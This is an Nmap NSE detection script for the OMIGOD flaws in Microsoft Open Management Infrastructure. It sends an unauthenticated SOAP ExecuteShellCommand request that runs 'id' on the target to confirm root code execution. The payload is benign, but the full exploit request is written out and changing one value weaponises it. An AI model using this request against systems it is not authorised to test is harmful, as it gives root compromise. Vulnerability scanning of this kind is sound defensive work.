--Import the required NSE libraries
local shortport = require "shortport"
local http = require "http"
local vulns = require "vulns"
local string = require "string"
local stdnse = require "stdnse"

-- The Head section --
description = [[
Detection of multiple vulnerabilities in Open Management Infrastructure.

The script sends a crafted HTTP request to confirm the presence of a remote
code execution vulnerability.
]]

family = {"General"}
author = "SecPod Technologies"
license = "Copyright (C) 2021 SecPod Technologies"
categories = {"safe", "vuln", "exploit"}
script_reliability_of_detection = "Reliable"
script_id = "100872"
creation_date = "2021-09-20 13:33:26 (Mon, 20 Sep 2021)"
modification_date = "2021-09-20 13:33:26 (Mon, 20 Sep 2021)"


---
-- Required-TCP-Port : 5985, 5986, 1270
-- @usage
-- nmap --script open-management-infrastructure-rce-vuln.nse -p5986 <target>
-- nmap -sV --script open-management-infrastructure-rce-vuln.nse -p5986 <target>
--
-- @output
-- PORT    STATE SERVICE
-- 5986/tcp open  http
-- | open-management-infrastructure-rce-vuln:
-- |   VULNERABLE:
-- |   Open Management Infrastructure Multiple Vulnerabilities(OMIGOD)
-- |     State: VULNERABLE (Exploitable)
-- |     IDs:  1:CVE-2021-38648  2:CVE-2021-38645  3:CVE-2021-38649  CVE:CVE-2021-38647
-- |     Risk factor: High  CVSSv2: 10.0  CVSSv3: 9.8
-- |       Multiple flaws exist due to,
-- |       - An error which allows any request without an Authorization header has its privileges
-- |       default to root.
-- |       - Multiple errors which allow low privilege user to elevate privileges to root.
-- |
-- |       Successful exploitation will allow an attacker to execute arbitrary code on the
-- |       system and gain elevated privileges.
-- |
-- |     Extra information:
-- |
-- |     Affected versions: Microsoft Open Management Infrastructure (OMI) version 1.6.8-0 and prior.
-- |     Solution: Upgrade Microsoft Open Management Infrastructure (OMI) to version 1.6.8-1 or later
-- |     For more details refer the References
-- |     References:
-- |       https://github.com/horizon3ai/CVE-2021-38647/blob/main/omigod.py
-- |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-38647
-- |_      https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure
--
-- @xmloutput
-- <script id="open-management-infrastructure-rce-vuln" output="&#xa;  VULNERABLE:&#xa;  Open Management Infrastructure Multiple Vulnerabilities(OMIGOD)&#xa;    State: VULNERABLE (Exploitable)&#xa;    IDs:  1:CVE-2021-38648  2:CVE-2021-38645  3:CVE-2021-38649  CVE:CVE-2021-38647&#xa;    Risk factor: High  CVSSv2: 10.0  CVSSv3: 9.8&#xa;      Multiple flaws exist due to,&#xa;      - An error which allows any request without an Authorization header has its privileges&#xa;      default to root.&#xa;      - Multiple errors which allow low privilege user to elevate privileges to root.&#xa;      &#xa;      Successful exploitation will allow an attacker to execute arbitrary code on the&#xa;      system and gain elevated privileges. &#xa;      &#xa;    Extra information:&#xa;      &#xa;    Affected versions: Microsoft Open Management Infrastructure (OMI) version 1.6.8-0 and prior.&#xa;    Solution: Upgrade Microsoft Open Management Infrastructure (OMI) to version 1.6.8-1 or later&#xa;    For more details refer the References&#xa;    References:&#xa;      https://github.com/horizon3ai/CVE-2021-38647/blob/main/omigod.py&#xa;      https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure&#xa;      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-38647&#xa;"><table key="CVE-2021-38647">
-- <elem key="title">Open Management Infrastructure Multiple Vulnerabilities(OMIGOD)</elem>
-- <elem key="state">VULNERABLE (Exploitable)</elem>
-- <table key="ids">
-- <elem>1:CVE-2021-38648</elem>
-- <elem>2:CVE-2021-38645</elem>
-- <elem>3:CVE-2021-38649</elem>
-- <elem>CVE:CVE-2021-38647</elem>
-- </table>
-- <table key="scores">
-- <elem key="CVSSv2">10.0</elem>
-- <elem key="CVSSv3">9.8</elem>
-- </table>
-- <table key="description">
-- <elem>Multiple flaws exist due to,&#xa;- An error which allows any request without an Authorization header has its privileges&#xa;default to root.&#xa;- Multiple errors which allow low privilege user to elevate privileges to root.&#xa;&#xa;Successful exploitation will allow an attacker to execute arbitrary code on the&#xa;system and gain elevated privileges. &#xa;</elem>
-- </table>
-- <table key="extra_info">
-- <elem>&#xa;  Affected versions: Microsoft Open Management Infrastructure (OMI) version 1.6.8-0 and prior.&#xa;  Solution: Upgrade Microsoft Open Management Infrastructure (OMI) to version 1.6.8-1 or later&#xa;  For more details refer the References</elem>
-- </table>
-- <table key="refs">
-- <elem>https://github.com/horizon3ai/CVE-2021-38647/blob/main/omigod.py</elem>
-- <elem>https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure</elem>
-- <elem>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-38647</elem>
-- </table>
-- </table>
-- </script>
---


-- The Rule Section --
portrule = shortport.port_or_service({5985, 5986, 1270}, {"http", "https"})


-- The Action Section --
action = function(host, port)
    local url, response, extra_info, report, vuln, header, postdata, COMMAND

    local t_omi = stdnse.output_table()
    t_omi["Host"] = host.ip
    t_omi["Port"] = port.number

    -- Create Vulnerability Report
    vuln = {
        title = "Open Management Infrastructure Multiple Vulnerabilities(OMIGOD)",
        state = vulns.STATE.NOT_VULN,
        IDS = {CVE = "CVE-2021-38647", "CVE-2021-38648", "CVE-2021-38645", "CVE-2021-38649"},
        risk_factor = "High",
        scores = { CVSSv2 = "10.0", CVSSv3 = "9.8"},

        description = [[
Multiple flaws exist due to,
- An error which allows any request without an Authorization header has its privileges
default to root.
- Multiple errors which allow low privilege user to elevate privileges to root.

Successful exploitation will allow an attacker to execute arbitrary code on the
system and gain elevated privileges.
]],
        references = {
            "https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure",
            "https://github.com/horizon3ai/CVE-2021-38647/blob/main/omigod.py"
        }
    
    }
    report = vulns.Report:new(SCRIPT_NAME, host, port)

    url = '/wsman/'

    header = {["Content-Type"] = "application/soap+xml;charset=UTF-8"}
    COMMAND = 'id'
    postdata = '<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:h="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:xsi="http://www.w3.org/2001/XMLSchema">\n    <s:Header>\n       <a:To>HTTP://' .. host.ip .. ':' .. port.number .. '/wsman/</a:To>\n       <w:ResourceURI s:mustUnderstand="true">http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem</w:ResourceURI>\n       <a:ReplyTo>\n          <a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>\n       </a:ReplyTo>\n       <a:Action>http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteShellCommand</a:Action>\n       <w:MaxEnvelopeSize s:mustUnderstand="true">102400</w:MaxEnvelopeSize>\n       <a:MessageID>uuid:0AB58087-C2C3-0005-0000-000000010000</a:MessageID>\n       <w:OperationTimeout>PT1M30S</w:OperationTimeout>\n       <w:Locale xml:lang="en-us" s:mustUnderstand="false" />\n       <p:DataLocale xml:lang="en-us" s:mustUnderstand="false" />\n       <w:OptionSet s:mustUnderstand="true" />\n       <w:SelectorSet>\n          <w:Selector Name="__cimnamespace">root/scx</w:Selector>\n       </w:SelectorSet>\n    </s:Header>\n    <s:Body>\n       <p:ExecuteShellCommand_INPUT xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">          <p:command>' .. COMMAND .. '</p:command>\n          <p:timeout>0</p:timeout>\n       </p:ExecuteShellCommand_INPUT>\n    </s:Body>\n </s:Envelope>'

    response = http.post(host, port, url, {header=header}, nil, postdata)
    if(response and response.status ~= nil) then
        if(response.status == 200 and string.match(response.body, "uid=[0-9]+.*gid=[0-9]+")) then
                vuln.state = vulns.STATE.EXPLOIT
                extra_info = string.format("\n  Affected versions: Microsoft Open Management Infrastructure (OMI) version 1.6.8-0 and prior.\n  Solution: Upgrade Microsoft Open Management Infrastructure (OMI) to version 1.6.8-1 or later\n  For more details refer the References")
        end
    else
        vuln.state = vulns.STATE.NOT_VULN
        extra_info = string.format("\n  Not affected by OMIGOD vulnerabilities.")
    end
    vuln.extra_info = extra_info
    return report:make_output(vuln)
end
